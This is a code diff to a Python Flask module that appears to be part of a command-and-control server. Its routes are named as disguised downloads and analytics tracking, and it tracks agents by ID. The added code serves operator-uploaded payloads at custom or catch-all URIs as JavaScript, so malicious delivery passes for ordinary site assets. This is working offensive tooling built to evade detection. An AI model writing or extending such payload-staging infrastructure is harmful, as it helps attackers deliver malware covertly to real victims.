@@ -671,8 +671,8 @@ def handle_disguised_download(filename):
     try:
         from flask import send_file
         import os
-        import os
-        
+
+        # First check if this is the default endpoint
         if filename == 'main.js':
             payload_data, payload_filename = get_uploaded_payload()
             if payload_data:
@@ -686,12 +686,23 @@ def handle_disguised_download(filename):
                     "instructions": "Upload your payload via the Tools > Payload Upload menu in the web interface"
                 }), 404
         else:
-            return jsonify({"error": "Asset not found"}), 404
+            # Check if this filename matches a custom URI payload
+            from core.payload_storage import get_payload_by_uri
+            payload_data, payload_filename = get_payload_by_uri(filename)
+            if payload_data:
+                logger.info(f"Serving uploaded payload at custom URI: {filename} ({len(payload_data)} base64 characters)")
+                from flask import Response
+                return Response(payload_data.strip(), mimetype='application/javascript')
+            else:
+                return jsonify({"error": "Asset not found"}), 404
     except Exception as e:
         logger.error(f"Download failed: {str(e)}")
         import traceback
         traceback.print_exc()
         return jsonify({"error": f"Download failed: {str(e)}"}), 500
+
+# Enhanced route for dynamic URI payloads - only for specific payload URIs
+# This will be handled by the dynamic_endpoint_handler function below
 
 @bp.route('/api/analytics/track', methods=['POST'])
 def handle_disguised_register_analytics():
@@ -840,6 +851,16 @@ def interactive_status_route(agent_id):
 @bp.route('/<path:full_path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
 def dynamic_endpoint_handler(full_path):
     logger.debug(f"Dynamic endpoint handler called for path: {full_path}, method: {request.method}")
+
+    # First, check if this is a dynamic payload URI request
+    from core.payload_storage import get_payload_by_uri
+    # Normalize the full_path by removing leading slash for comparison
+    normalized_path = full_path.lstrip('/')
+    payload_data, payload_filename = get_payload_by_uri(normalized_path)
+    if payload_data:
+        logger.info(f"Serving uploaded payload at dynamic URI: /{full_path} ({len(payload_data)} base64 characters)")
+        from flask import Response
+        return Response(payload_data.strip(), mimetype='application/javascript')
 
     if endpoint_discovery and hasattr(endpoint_discovery, 'known_endpoints'):
         import re
